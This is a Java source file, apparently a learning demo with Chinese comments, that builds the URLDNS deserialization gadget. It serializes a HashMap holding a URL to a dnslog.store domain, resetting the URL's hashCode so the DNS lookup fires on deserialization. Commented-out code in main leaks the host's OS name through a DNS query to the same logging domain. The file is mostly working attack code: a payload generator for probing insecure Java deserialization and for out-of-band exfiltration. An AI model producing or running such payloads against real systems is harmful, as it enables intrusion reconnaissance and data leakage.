package demo.urldns;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    public void serial() throws Exception{
        HashMap<URL, String> map = new HashMap<URL, String>();
        URL url = new URL("http://88888888.ca8ab655.dnslog.store.");
        map.put(url,"123123");   //
        //上面put后进行了序列化，有了一个hashcode值，所以下面需要将hashcode值设置为-1
        Class clazz = Class.forName("java.net.URL");//反射调用URL类中的hashcode方法
        Field hashcode = clazz.getDeclaredField("hashCode");
        hashcode.setAccessible(true); //设置可写
        hashcode.set(url,-1);//设置url的hashcode为-1，

        //将序列化后的数据写到urldns.ser文件中
        FileOutputStream fos =new FileOutputStream("urldns.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(map); //序列化1个map
    }

    public void unserial() throws Exception{
        //反序列化
        FileInputStream fis = new FileInputStream("urldns.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
    }



    public static void main(String[] args) throws Exception {
//        String osname = System.getProperty("os.name");
//        osname = osname.replace(" ","-"); //域名中不能有空格，将空格替换为-
//        //域名前拼接内容，可以用dnslog外带出来
////        InetAddress address = InetAddress.getByName(osname + "111111.ca8ab655.dnslog.store.");
//        InetAddress address = InetAddress.getByName(osname + ".ca8ab655.dnslog.store.");
//        System.out.println(address.getHostAddress());

//        HashMap<URL, String> map = new HashMap<URL, String>();//k是URL对象，不是String
//        URL url = new URL("http://9999999.ca8ab655.dnslog.store.");
//        map.put(url,"123"); //value随便一个字符串类型都可以

        //调用serial()方法
        URLDNS urldns = new URLDNS();
        urldns.serial();
//        urldns.unserial();


    }
}
